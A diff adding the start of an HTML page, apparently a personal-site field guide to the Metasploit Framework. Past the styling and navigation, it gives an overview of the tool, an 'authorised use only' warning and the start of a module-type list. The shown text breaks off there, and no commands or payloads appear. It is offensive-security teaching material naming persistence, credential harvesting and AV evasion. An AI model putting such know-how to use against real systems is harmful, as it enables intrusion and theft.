@@ -1,0 +1,1306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mastering the Metasploit Framework | Nisarg Chasmawala</title>
+<meta name="description" content="Mastering the Metasploit Framework — a complete field guide by Nisarg Chasmawala (Shroff), Offensive Security Engineer.">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --g:#00ff41;--c:#00e5ff;--p:#bf00ff;--r:#ff003c;--o:#ffd700;
+  --bg:#030509;--t1:#d4ffe0;--t2:#7aad82;--t3:#2e4a32;
+  --mono:'Share Tech Mono',monospace;--dsp:'Orbitron',sans-serif;--body:'Rajdhani',sans-serif;
+  --glow:0 0 20px rgba(0,255,65,.4),0 0 60px rgba(0,255,65,.15);
+  --cglow:0 0 20px rgba(0,229,255,.4),0 0 60px rgba(0,229,255,.1);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;overflow-x:hidden}
+body{background:var(--bg);color:var(--t1);font-family:var(--body);font-size:17px;line-height:1.8;overflow-x:hidden;cursor:none}
+
+/* ── BG LAYERS ── */
+#bg-particle{position:fixed;inset:0;z-index:0;pointer-events:none}
+#bg-hex{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.35}
+#bg-scan{position:fixed;inset:0;z-index:9999;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.009) 2px,rgba(0,255,65,.009) 4px)}
+#bg-vignette{position:fixed;inset:0;z-index:1;pointer-events:none;background:radial-gradient(ellipse at 50% 50%,transparent 50%,rgba(3,5,9,.85) 100%)}
+#bg-noise{position:fixed;inset:0;z-index:2;pointer-events:none;opacity:.04;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");background-size:200px 200px;animation:grain .4s steps(1) infinite}
+@keyframes grain{0%{transform:translate(0,0)}10%{transform:translate(-2%,-2%)}20%{transform:translate(2%,2%)}30%{transform:translate(-1%,1%)}40%{transform:translate(1%,-1%)}50%{transform:translate(-3%,1%)}60%{transform:translate(1%,3%)}70%{transform:translate(-1%,-2%)}80%{transform:translate(2%,1%)}90%{transform:translate(-2%,2%)}}
+
+/* ── CURSOR ── */
+#cur{position:fixed;width:10px;height:10px;border-radius:50%;background:var(--g);box-shadow:var(--glow);pointer-events:none;z-index:99999;transform:translate(-50%,-50%);transition:width .1s,height .1s}
+#cur2{position:fixed;width:30px;height:30px;border-radius:50%;border:1px solid rgba(0,255,65,.5);pointer-events:none;z-index:99998;transform:translate(-50%,-50%);transition:left .08s,top .08s}
+#cur3{position:fixed;width:50px;height:50px;border-radius:50%;border:1px solid rgba(0,255,65,.2);pointer-events:none;z-index:99997;transform:translate(-50%,-50%);transition:left .15s,top .15s}
+
+/* ── PROGRESS ── */
+#prog{position:fixed;top:0;left:0;height:2px;background:linear-gradient(to right,var(--g),var(--c));box-shadow:0 0 10px var(--g),0 0 20px var(--c);z-index:10000;width:0%}
+
+/* ── TOPBAR ── */
+.topbar{position:fixed;top:0;left:0;right:0;height:58px;background:rgba(3,5,9,.88);border-bottom:1px solid rgba(0,255,65,.12);backdrop-filter:blur(20px) saturate(1.5);z-index:1000;display:flex;align-items:center;justify-content:space-between;padding:0 32px}
+.tb-left{display:flex;flex-direction:column;gap:2px}
+.tb-name{font-family:var(--dsp);font-size:13px;font-weight:900;color:var(--t1);letter-spacing:3px;text-shadow:0 0 20px rgba(255,255,255,.2)}
+.tb-roles{font-family:var(--mono);font-size:9px;letter-spacing:1.5px;overflow:hidden;white-space:nowrap}
+.tb-inner{display:inline-block;color:var(--c);animation:ticker 18s linear infinite}
+@keyframes ticker{0%{transform:translateX(100%)}100%{transform:translateX(-100%)}}
+.tb-status{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:11px;color:var(--g)}
+.tb-dot{width:7px;height:7px;border-radius:50%;background:var(--g);box-shadow:0 0 10px var(--g);animation:tdot 1.2s ease-in-out infinite}
+@keyframes tdot{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.3;transform:scale(.7)}}
+
+/* ── TOC ── */
+.toc{position:fixed;right:20px;top:50%;transform:translateY(-50%);z-index:200;display:flex;flex-direction:column;gap:10px}
+.toc-i{display:flex;align-items:center;gap:8px;cursor:pointer}
+.toc-d{width:6px;height:6px;border-radius:50%;border:1px solid var(--t3);transition:all .25s;flex-shrink:0}
+.toc-i.active .toc-d,.toc-i:hover .toc-d{background:var(--g);border-color:var(--g);box-shadow:0 0 10px var(--g)}
+.toc-l{font-family:var(--mono);font-size:10px;color:var(--t3);opacity:0;transform:translateX(6px);transition:all .2s;white-space:nowrap}
+.toc-i:hover .toc-l,.toc-i.active .toc-l{opacity:1;transform:none;color:var(--g)}
+@media(max-width:1000px){.toc{display:none}}
+
+/* ── WRAPPER ── */
+.wrap{position:relative;z-index:10;max-width:980px;margin:0 auto;padding:0 28px}
+
+/* ── HERO ── */
+.hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;padding:100px 0 60px;position:relative}
+.hero-canvas-wrap{position:absolute;right:-80px;top:50%;transform:translateY(-52%);width:500px;height:500px;pointer-events:none}
+#hero-geo{width:100%;height:100%}
+.hero-tag{font-family:var(--mono);font-size:11px;letter-spacing:4px;color:var(--c);text-transform:uppercase;margin-bottom:18px;opacity:0;animation:fup .6s ease forwards .3s;display:flex;align-items:center;gap:12px}
+.hero-tag::before{content:'';width:40px;height:1px;background:linear-gradient(to right,transparent,var(--c))}
+.hero-tag::after{content:'';flex:1;max-width:100px;height:1px;background:linear-gradient(to right,var(--c),transparent)}
+.hero-title{font-family:var(--dsp);font-size:clamp(26px,4.8vw,58px);font-weight:900;line-height:1.0;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;opacity:0;animation:fup .7s ease forwards .5s}
+.ht-line1{display:block;color:var(--g);text-shadow:0 0 40px rgba(0,255,65,.6),0 0 100px rgba(0,255,65,.25),0 4px 0 rgba(0,200,50,.3)}
+.ht-sub{display:block;font-size:.44em;letter-spacing:6px;color:rgba(200,255,220,.5);font-weight:400;margin-top:10px}
+.gw{position:relative;display:inline-block}
+.gw::before,.gw::after{content:attr(data-t);position:absolute;top:0;left:0;width:100%;font-family:var(--dsp);font-weight:900;font-size:inherit;letter-spacing:inherit;text-transform:uppercase}
+.gw::before{color:var(--c);animation:ga 5s infinite;clip-path:polygon(0 0,100% 0,100% 33%,0 33%)}
+.gw::after{color:var(--r);animation:gb 5s infinite;clip-path:polygon(0 66%,100% 66%,100% 100%,0 100%)}
+@keyframes ga{0%,85%,100%{transform:none;opacity:0}87%{transform:translate(-5px,2px);opacity:.9}89%{transform:translate(5px,-2px);opacity:.7}91%{transform:translate(-3px,1px);opacity:.85}93%{transform:none;opacity:0}}
+@keyframes gb{0%,87%,100%{transform:none;opacity:0}89%{transform:translate(5px,3px);opacity:.8}91%{transform:translate(-5px,-2px);opacity:.6}93%{transform:translate(3px,1px);opacity:.75}95%{transform:none;opacity:0}}
+.hero-desc{font-size:17px;font-weight:300;color:var(--t2);max-width:560px;line-height:1.75;margin-bottom:36px;opacity:0;animation:fup .8s ease forwards .8s;margin-top:20px}
+.hero-meta{display:flex;gap:24px;flex-wrap:wrap;opacity:0;animation:fup .8s ease forwards 1s}
+.m-item{display:flex;flex-direction:column;gap:3px}
+.m-lbl{font-family:var(--mono);font-size:9px;letter-spacing:3px;color:var(--t3);text-transform:uppercase}
+.m-val{font-family:var(--mono);font-size:12px;color:var(--c)}
+.hero-scroll-hint{position:absolute;bottom:24px;left:0;display:flex;align-items:center;gap:12px;opacity:0;animation:fin 1s ease forwards 1.8s}
+.hs-line{width:60px;height:1px;background:linear-gradient(to right,var(--g),transparent)}
+.hs-txt{font-family:var(--mono);font-size:9px;letter-spacing:3px;color:var(--t3)}
+.hs-pulse{width:6px;height:6px;border-radius:50%;background:var(--g);box-shadow:0 0 8px var(--g);animation:tdot 1.5s ease-in-out infinite}
+
+/* ── SECTIONS ── */
+.sec{margin-bottom:100px}
+.sec-hd{display:flex;align-items:center;gap:14px;margin-bottom:40px}
+.sec-n{font-family:var(--mono);font-size:10px;color:var(--p);letter-spacing:2px;min-width:44px}
+.sec-ln{flex:1;height:1px;background:linear-gradient(to right,rgba(0,229,255,.35),transparent)}
+.sec-t{font-family:var(--dsp);font-size:clamp(15px,2.6vw,22px);font-weight:700;letter-spacing:3px;text-transform:uppercase;color:var(--c);text-shadow:var(--cglow)}
+.tw-cursor{display:inline-block;width:2px;height:1em;background:var(--c);margin-left:4px;animation:blink 1s step-end infinite;vertical-align:middle}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+
+/* ── PANELS ── */
+.panel{background:rgba(0,255,65,.025);border:1px solid rgba(0,255,65,.12);border-radius:4px;padding:32px;margin-bottom:22px;position:relative;overflow:hidden;transition:border-color .3s,box-shadow .3s,transform .3s;transform-style:preserve-3d}
+.panel::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(to bottom,var(--g),transparent);opacity:0;transition:opacity .3s}
+.panel::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.015) 0%,transparent 60%);pointer-events:none}
+.panel:hover{border-color:rgba(0,229,255,.4);box-shadow:0 0 50px rgba(0,229,255,.07),inset 0 0 40px rgba(0,229,255,.025),0 20px 60px rgba(0,0,0,.3);transform:translateY(-3px) translateZ(6px)}
+.panel:hover::before{opacity:1}
+.panel p{color:var(--t2);margin-bottom:12px}
+.panel p:last-child{margin-bottom:0}
+.panel-t{font-family:var(--dsp);font-size:12px;font-weight:700;letter-spacing:3px;color:var(--g);text-transform:uppercase;margin-bottom:18px;display:flex;align-items:center;gap:12px}
+.panel-t::after{content:'';flex:1;height:1px;background:linear-gradient(to right,rgba(0,255,65,.2),transparent)}
+
+/* ── MODULE CARDS (purple) ── */
+.vgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(275px,1fr));gap:18px;margin-bottom:28px;perspective:1200px}
+.vc{background:rgba(191,0,255,.03);border:1px solid rgba(191,0,255,.15);border-radius:4px;padding:24px;position:relative;overflow:hidden;cursor:default;transform-style:preserve-3d;transition:box-shadow .25s;will-change:transform}
+.vc::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.04) 0%,transparent 50%);opacity:0;transition:opacity .25s}
+.vc::after{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:32px solid rgba(191,0,255,.25);border-left:32px solid transparent}
+.vc:hover::before{opacity:1}
+.vcn{font-family:var(--mono);font-size:44px;color:rgba(191,0,255,.09);position:absolute;top:6px;right:12px;line-height:1}
+.vcname{font-family:var(--dsp);font-size:11px;font-weight:700;letter-spacing:2px;color:var(--p);text-transform:uppercase;margin-bottom:10px}
+.vcdesc{font-size:14px;color:var(--t2);line-height:1.65;font-weight:300}
+.vtag{display:inline-block;margin-top:12px;font-family:var(--mono);font-size:9px;letter-spacing:2px;padding:3px 10px;border-radius:2px;text-transform:uppercase}
+.vt-p{background:rgba(191,0,255,.1);color:var(--p);border:1px solid rgba(191,0,255,.28)}
+.vt-c{background:rgba(0,229,255,.08);color:var(--c);border:1px solid rgba(0,229,255,.25)}
+.vt-g{background:rgba(0,255,65,.08);color:var(--g);border:1px solid rgba(0,255,65,.22)}
+.vt-o{background:rgba(255,215,0,.08);color:var(--o);border:1px solid rgba(255,215,0,.22)}
+.vt-r{background:rgba(255,0,60,.1);color:var(--r);border:1px solid rgba(255,0,60,.28)}
+
+/* ── COMMAND TABLE ── */
+.ctbl{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:12px;margin:16px 0}
+.ctbl th{text-align:left;padding:11px 16px;color:var(--c);border-bottom:1px solid rgba(0,229,255,.3);letter-spacing:2px;font-size:10px;text-transform:uppercase}
+.ctbl td{padding:11px 16px;color:var(--t2);border-bottom:1px solid rgba(0,255,65,.05);vertical-align:top}
+.ctbl tr:hover td{background:rgba(0,255,65,.02)}
+.ctbl td:first-child{color:var(--g)}
+.ctbl td:nth-child(2){color:var(--o)}
+
+/* ── TOOL / PHASE CARDS (cyan) ── */
+.tgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:14px;margin:20px 0;perspective:800px}
+.tc{background:rgba(0,229,255,.03);border:1px solid rgba(0,229,255,.1);border-radius:4px;padding:20px;transition:all .25s;position:relative;overflow:hidden;transform-style:preserve-3d}
+.tc::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;background:linear-gradient(to right,var(--c),transparent);transform:scaleX(0);transform-origin:left;transition:transform .3s}
+.tc:hover{border-color:rgba(0,229,255,.4);background:rgba(0,229,255,.06);box-shadow:var(--cglow),0 12px 40px rgba(0,0,0,.2);transform:translateY(-3px)}
+.tc:hover::after{transform:scaleX(1)}
+.tcname{font-family:var(--mono);font-size:13px;color:var(--c);margin-bottom:5px}
+.tctag{font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--o);text-transform:uppercase;margin-bottom:8px;display:block}
+.tcdesc{font-size:13px;color:var(--t3);line-height:1.5}
+
+/* ── TECHNIQUE CARDS (red) ── */
+.atk{background:rgba(255,0,60,.03);border:1px solid rgba(255,0,60,.12);border-radius:4px;padding:28px;margin-bottom:24px;position:relative;overflow:hidden;transition:all .3s;transform-style:preserve-3d}
+.atk::before{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:32px solid rgba(255,0,60,.25);border-left:32px solid transparent}
+.atk::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,0,60,.03),transparent);opacity:0;transition:opacity .3s;pointer-events:none}
+.atk:hover{border-color:rgba(255,0,60,.4);box-shadow:0 0 60px rgba(255,0,60,.05),0 20px 60px rgba(0,0,0,.3);transform:translateY(-3px)}
+.atk:hover::after{opacity:1}
+.atk-name{font-family:var(--dsp);font-size:12px;font-weight:700;letter-spacing:3px;color:var(--r);text-transform:uppercase;margin-bottom:14px}
+.atk-body{color:var(--t2);font-size:15px;margin-bottom:16px;line-height:1.75}
+
+/* ── METERPRETER COMMAND GRID ── */
+.mgrid-post{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:14px;margin:20px 0}
+.mpc{background:rgba(0,255,65,.025);border:1px solid rgba(0,255,65,.1);border-radius:4px;padding:18px;transition:all .25s;position:relative;overflow:hidden}
+.mpc::after{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:22px solid rgba(0,255,65,.18);border-left:22px solid transparent}
+.mpc:hover{border-color:rgba(0,255,65,.38);box-shadow:var(--glow),0 12px 30px rgba(0,0,0,.2);transform:translateY(-2px)}
+.mpc-cat{font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--g);text-transform:uppercase;margin-bottom:10px;display:block}
+.mpc-cmd{font-family:var(--mono);font-size:12px;color:var(--c);margin-bottom:4px}
+.mpc-desc{font-size:13px;color:var(--t3);line-height:1.5}
+
+/* ── BEST PRACTICE CHECKLIST ── */
+.chk{list-style:none}
+.chk li{display:flex;align-items:flex-start;gap:12px;padding:11px 0;border-bottom:1px solid rgba(0,255,65,.05);font-size:14px;color:var(--t2);line-height:1.6}
+.chk li:last-child{border-bottom:none}
+.chk-i{flex-shrink:0;width:18px;height:18px;border:1px solid var(--g);border-radius:2px;display:flex;align-items:center;justify-content:center;margin-top:2px;background:rgba(0,255,65,.05)}
+.chk-i::after{content:'✓';font-size:10px;color:var(--g);font-family:var(--mono)}
+.chk li strong{color:var(--t1);font-weight:600}
+
+/* ── CODE BLOCKS ── */
+.cb{background:rgba(0,0,0,.7);border:1px solid rgba(0,255,65,.1);border-left:3px solid var(--g);border-radius:0 4px 4px 0;padding:22px 26px;margin:16px 0;position:relative;overflow-x:auto;transition:all .3s;cursor:pointer}
+.cb::before{content:attr(data-l);position:absolute;top:0;right:0;font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--g);background:rgba(0,255,65,.07);padding:3px 12px;border-bottom-left-radius:4px;text-transform:uppercase}
+.cb::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(to right,var(--g),transparent);opacity:0;transition:opacity .3s}
+.cb:hover{border-color:rgba(0,255,65,.35);box-shadow:0 0 30px rgba(0,255,65,.04)}
+.cb:hover::after{opacity:.5}
+.cb code{font-family:var(--mono);font-size:13px;color:var(--g);white-space:pre;display:block;line-height:1.9}
+.cmd{color:var(--c)}.flag{color:var(--o)}.cmt{color:var(--t3)}.str{color:#ff79c6}.prm{color:#bd93f9}.kw{color:var(--r)}.fn{color:#8be9fd}
+
+/* ── ALERTS ── */
+.alert{border-radius:4px;padding:16px 20px;margin:20px 0;display:flex;gap:14px;align-items:flex-start}
+.al-w{background:rgba(255,215,0,.04);border:1px solid rgba(255,215,0,.18);border-left:3px solid var(--o)}
+.al-i{background:rgba(0,229,255,.04);border:1px solid rgba(0,229,255,.14);border-left:3px solid var(--c)}
+.al-ic{font-family:var(--mono);font-size:13px;flex-shrink:0;margin-top:2px}
+.al-w .al-ic{color:var(--o)}.al-i .al-ic{color:var(--c)}
+.al-tx{font-size:14px;color:var(--t2);line-height:1.6}
+
+/* ── CTA ── */
+.cta{background:linear-gradient(135deg,rgba(0,255,65,.04),rgba(0,229,255,.04));border:1px solid rgba(0,229,255,.3);border-radius:4px;padding:60px 50px;text-align:center;position:relative;overflow:hidden;margin-top:80px}
+.cta::before{content:'MSF';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-family:var(--dsp);font-size:200px;font-weight:900;color:rgba(0,255,65,.018);pointer-events:none;white-space:nowrap;letter-spacing:30px}
+.cta-t{font-family:var(--dsp);font-size:20px;font-weight:700;letter-spacing:4px;color:var(--g);text-transform:uppercase;margin-bottom:16px;text-shadow:var(--glow)}
+.cta-p{color:var(--t2);font-size:16px;max-width:540px;margin:0 auto 32px;line-height:1.75}
+.cta-btns{display:flex;gap:16px;justify-content:center;flex-wrap:wrap}
+.btn{font-family:var(--mono);font-size:11px;letter-spacing:3px;text-transform:uppercase;padding:13px 30px;border-radius:2px;text-decoration:none;display:inline-block;transition:all .25s}
+.btn-p{border:1px solid var(--g);color:var(--g);background:rgba(0,255,65,.06)}
+.btn-p:hover{background:var(--g);color:var(--bg);box-shadow:var(--glow)}
+.btn-s{border:1px solid var(--c);color:var(--c);background:rgba(0,229,255,.05)}
+.btn-s:hover{background:var(--c);color:var(--bg);box-shadow:var(--cglow)}
+
+/* ── FOOTER ── */
+.footer{border-top:1px solid rgba(0,255,65,.1);padding:32px 0;margin-top:60px;display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:20px}
+.f-l{font-family:var(--mono);font-size:11px;color:var(--t3);letter-spacing:1.5px;line-height:2}
+.f-alias{color:var(--g);font-size:10px;letter-spacing:3px;text-shadow:0 0 8px var(--g)}
+.f-r{font-family:var(--mono);font-size:11px;color:var(--t3);text-align:right;line-height:2}
+.f-r a{color:var(--g);text-decoration:none;transition:text-shadow .2s}
+.f-r a:hover{text-shadow:var(--glow)}
+
+/* ── DIVIDER ── */
+.div{height:1px;background:linear-gradient(to right,transparent,rgba(0,255,65,.15),transparent);margin:60px 0;position:relative}
+.div::after{content:'';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:6px;height:6px;border-radius:50%;background:var(--g);box-shadow:0 0 12px var(--g)}
+
+/* ── ANIMATIONS ── */
+@keyframes fup{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:none}}
+@keyframes fin{from{opacity:0}to{opacity:1}}
+.rv{opacity:0;transform:translateY(30px);transition:opacity .8s,transform .8s}
+.rv-l{opacity:0;transform:translateX(-30px);transition:opacity .8s,transform .8s}
+.rv-r{opacity:0;transform:translateX(30px);transition:opacity .8s,transform .8s}
+.rv.on,.rv-l.on,.rv-r.on{opacity:1;transform:none}
+
+/* ── RESPONSIVE ── */
+@media(max-width:700px){.vgrid,.tgrid,.mgrid-post,.ai-grid{grid-template-columns:1fr}.hero-canvas-wrap{display:none}.cta{padding:36px 20px}.cta::before{font-size:80px}}
+
+/* ── AI STYLES ── */
+:root{--pglow:0 0 20px rgba(191,0,255,.4),0 0 60px rgba(191,0,255,.1)}
+.sec-ai .sec-t{color:#bf00ff;text-shadow:var(--pglow)}
+.sec-ai .sec-n{color:var(--c)}
+.sec-ai .sec-ln{background:linear-gradient(to right,rgba(191,0,255,.35),transparent)}
+.sec-ai .tw-cursor{background:#bf00ff}
+.div-ai{background:linear-gradient(to right,transparent,rgba(191,0,255,.22),transparent)}
+.div-ai::after{background:#bf00ff;box-shadow:0 0 12px #bf00ff}
+.panel-ai{background:rgba(191,0,255,.03);border-color:rgba(191,0,255,.18)}
+.panel-ai:hover{border-color:rgba(191,0,255,.45)}
+.panel-ai .panel-t{color:#bf00ff}
+.panel-ai .panel-t::after{background:linear-gradient(to right,rgba(191,0,255,.2),transparent)}
+.panel-ai::before{background:linear-gradient(to bottom,#bf00ff,transparent)}
+.ai-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(270px,1fr));gap:16px;margin:20px 0}
+.ai-card{background:rgba(191,0,255,.04);border:1px solid rgba(191,0,255,.18);border-radius:4px;padding:22px;position:relative;overflow:hidden;transition:all .3s}
+.ai-card::after{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:26px solid rgba(191,0,255,.25);border-left:26px solid transparent}
+.ai-card:hover{border-color:rgba(191,0,255,.5);box-shadow:var(--pglow),0 16px 40px rgba(0,0,0,.25);transform:translateY(-3px)}
+.ai-ico{font-size:24px;margin-bottom:10px;display:block}
+.ai-name{font-family:var(--dsp);font-size:11px;font-weight:700;letter-spacing:2px;color:#bf00ff;text-transform:uppercase;margin-bottom:10px}
+.ai-desc{font-size:14px;color:var(--t2);line-height:1.65;font-weight:300}
+.cb-ai{border-left-color:#bf00ff !important}
+.cb-ai::before{color:#bf00ff !important;background:rgba(191,0,255,.07) !important}
+.al-p{background:rgba(191,0,255,.04);border:1px solid rgba(191,0,255,.18);border-left:3px solid #bf00ff}
+.al-p .al-ic{color:#bf00ff}
+</style>
+</style>
+</head>
+<body>
+
+<canvas id="bg-particle"></canvas>
+<canvas id="bg-hex"></canvas>
+<div id="bg-vignette"></div>
+<div id="bg-noise"></div>
+<div id="bg-scan"></div>
+<div id="cur"></div><div id="cur2"></div><div id="cur3"></div>
+<div id="prog"></div>
+
+<!-- ══ TOPBAR ══ -->
+<nav class="topbar">
+  <div class="tb-left">
+    <span class="tb-name">NISARG CHASMAWALA (SHROFF)</span>
+    <div class="tb-roles">
+      <span class="tb-inner">
+        Penetration Tester &nbsp;|&nbsp; Vulnerability Assessment &nbsp;|&nbsp;
+        Cybersecurity Researcher &nbsp;|&nbsp; Offensive Security Engineer &nbsp;|&nbsp;
+        Digital Forensics &nbsp;|&nbsp; Penetration Tester &nbsp;|&nbsp; Vulnerability Assessment &nbsp;|&nbsp;
+        Cybersecurity Researcher &nbsp;|&nbsp; Offensive Security Engineer &nbsp;|&nbsp; Digital Forensics
+      </span>
+    </div>
+  </div>
+  <div class="tb-status"><span class="tb-dot"></span>SYS ONLINE</div>
+</nav>
+
+<!-- ══ TOC ══ -->
+<nav class="toc" id="toc">
+  <div class="toc-i active" onclick="goTo('#hero')" data-s="hero"><div class="toc-d"></div><span class="toc-l">INTRO</span></div>
+  <div class="toc-i" onclick="goTo('#what')" data-s="what"><div class="toc-d"></div><span class="toc-l">WHAT IS MSF</span></div>
+  <div class="toc-i" onclick="goTo('#architecture')" data-s="architecture"><div class="toc-d"></div><span class="toc-l">ARCHITECTURE</span></div>
+  <div class="toc-i" onclick="goTo('#setup')" data-s="setup"><div class="toc-d"></div><span class="toc-l">SETUP</span></div>
+  <div class="toc-i" onclick="goTo('#recon')" data-s="recon"><div class="toc-d"></div><span class="toc-l">RECON &amp; SCAN</span></div>
+  <div class="toc-i" onclick="goTo('#exploit')" data-s="exploit"><div class="toc-d"></div><span class="toc-l">EXPLOITATION</span></div>
+  <div class="toc-i" onclick="goTo('#post')" data-s="post"><div class="toc-d"></div><span class="toc-l">POST-EXPLOIT</span></div>
+  <div class="toc-i" onclick="goTo('#payloads')" data-s="payloads"><div class="toc-d"></div><span class="toc-l">PAYLOADS</span></div>
+  <div class="toc-i" onclick="goTo('#evasion')" data-s="evasion"><div class="toc-d"></div><span class="toc-l">EVASION</span></div>
+  <div class="toc-i" onclick="goTo('#ai')" data-s="ai"><div class="toc-d"></div><span class="toc-l">AI INTEGRATION</span></div>
+</nav>
+
+<div class="wrap">
+
+<!-- ══════════════════════════════════ HERO ══════════════════════════════════ -->
+<section class="hero" id="hero">
+  <div class="hero-canvas-wrap"><canvas id="hero-geo"></canvas></div>
+
+  <div class="hero-tag">NISARG CHASMAWALA &nbsp;//&nbsp; ALIAS: HEAVEN</div>
+
+  <h1 class="hero-title">
+    <div class="gw" data-t="METASPLOIT">
+      <span class="ht-line1">METASPLOIT</span>
+    </div>
+    <span class="ht-sub">FRAMEWORK — MASTERY FIELD GUIDE</span>
+  </h1>
+
+  <p class="hero-desc">
+    A comprehensive deep dive into the Metasploit Framework — from architecture and core 
+    components through reconnaissance, exploitation workflows, Meterpreter post-exploitation, 
+    custom payload generation with msfvenom, and AV evasion techniques. The definitive guide 
+    for penetration testers who need more than surface-level familiarity.
+  </p>
+
+  <div class="hero-meta">
+    <div class="m-item"><span class="m-lbl">Author</span><span class="m-val">Nisarg Chasmawala (Shroff)</span></div>
+    <div class="m-item"><span class="m-lbl">Alias</span><span class="m-val">HEAVEN</span></div>
+    <div class="m-item"><span class="m-lbl">Category</span><span class="m-val">Metasploit · Exploitation · Red Team</span></div>
+    <div class="m-item"><span class="m-lbl">Level</span><span class="m-val">Beginner → Advanced</span></div>
+  </div>
+
+  <div class="hero-scroll-hint">
+    <div class="hs-line"></div>
+    <span class="hs-txt">SCROLL TO BEGIN</span>
+    <div class="hs-pulse"></div>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══════════════════════════════════
+     01 — WHAT IS METASPLOIT
+══════════════════════════════════ -->
+<section class="sec rv" id="what">
+  <div class="sec-hd">
+    <span class="sec-n">01 //</span>
+    <h2 class="sec-t">What is the Metasploit Framework?<span class="tw-cursor"></span></h2>
+    <div class="sec-ln"></div>
+  </div>
+
+  <div class="panel rv-l">
+    <p>The <strong style="color:var(--t1)">Metasploit Framework (MSF)</strong> is the world's most widely used open-source penetration testing platform, maintained by Rapid7. First released by HD Moore in 2003 and acquired by Rapid7 in 2009, it has grown from a simple exploit collection into a full-featured offensive security platform with over 2,300 exploit modules, 1,000+ auxiliary modules, and hundreds of post-exploitation capabilities.</p>
+    <p>What makes Metasploit uniquely powerful is its modularity — every component is interchangeable. The same framework that runs a known CVE exploit against a Windows server can fuzz a network protocol, generate a custom payload for a specific architecture, bypass antivirus, and maintain persistent access across reboots — all within a single, unified console. For a penetration tester, mastering Metasploit is not optional; it is foundational.</p>
+  </div>
+
+  <div class="alert al-w rv">
+    <span class="al-ic">[ ⚠ ]</span>
+    <p class="al-tx"><strong>Authorised Use Only.</strong> Metasploit is a professional penetration testing tool. All techniques in this guide must be performed exclusively in authorised environments — your own lab, a CTF platform, or under explicit written permission from the target system owner. Unauthorised use is a criminal offence.</p>
+  </div>
+
+  <div class="panel rv">
+    <div class="panel-t">Core Capabilities</div>
+    <p>Metasploit spans the entire penetration testing lifecycle — it is not just an exploit launcher. Its capability set covers network discovery and service enumeration (via auxiliary scanner modules), known CVE exploitation (2,300+ exploit modules covering Windows, Linux, web apps, databases, and network devices), payload generation and delivery, Meterpreter-based post-exploitation, privilege escalation, persistence mechanisms, credential harvesting, and AV/EDR evasion. It integrates natively with Nmap, Nessus, OpenVAS, and Burp Suite for a full-stack assessment workflow.</p>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══════════════════════════════════
+     02 — ARCHITECTURE
+══════════════════════════════════ -->
+<section class="sec rv" id="architecture">
+  <div class="sec-hd">
+    <span class="sec-n">02 //</span>
+    <h2 class="sec-t">Framework Architecture &amp; Module Types<span class="tw-cursor"></span></h2>
+    <div class="sec-ln"></div>
+  </div>
+
+  <div class="panel rv-l">
+    <p>Metasploit's power comes from its modular architecture. Every piece of functionality — from a network scanner to a privilege escalation technique — is encapsulated as a discrete module with standardised inputs and outputs. Understanding which module type to reach for in a given situation is what separates an effective MSF operator from someone who just knows a few commands.</p>
+  </div>
+
+  <div class="vgrid rv">
+    <div class="vc">
+      <span class="vcn">01</span>
+      <div class="vcname">Exploits</div>
+      <div class="vcdesc">Code that takes advantage of a specific vulnerability in a target system. Each exploit module targets a specific CVE or vulnerability class in a specific software version. Paired with a payload to deliver the attack and establish access. Over 2,300 exploits covering Windows, Linux, macOS, network devices, web frameworks, and databases.</div>
+      <span class="vtag vt-r">ATTACK</span>
+    </div>
+    <div class="vc">
+      <span class="vcn">02</span>
+      <div class="vcname">Payloads</div>
+      <div class="vcdesc">Code executed on the target system after a successful exploit. Singles (self-contained), Stagers (establish a channel then download the Stage), and Stages (the actual capability: Meterpreter, shell, VNC). Meterpreter is the most powerful — an in-memory agent with no files on disk, providing a rich API for post-exploitation.</div>
+      <span class="vtag vt-p">DELIVERY</span>
+    </div>
+    <div class="vc">
+      <span class="vcn">03</span>
+      <div class="vcname">Auxiliary Modules</div>
